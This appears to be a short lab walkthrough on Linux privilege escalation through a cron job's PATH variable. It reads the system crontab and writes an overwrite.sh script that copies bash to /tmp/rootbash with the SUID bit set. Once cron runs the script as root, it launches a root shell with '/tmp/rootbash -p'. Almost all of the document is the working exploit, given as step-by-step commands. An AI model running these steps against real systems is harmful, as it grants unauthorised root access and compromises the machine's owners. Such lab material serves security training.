# Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:

`cat /etc/crontab`

Note that the PATH variable starts with **/home/user** which is our user's home directory.

Create a file called **overwrite.sh** in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run. Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`
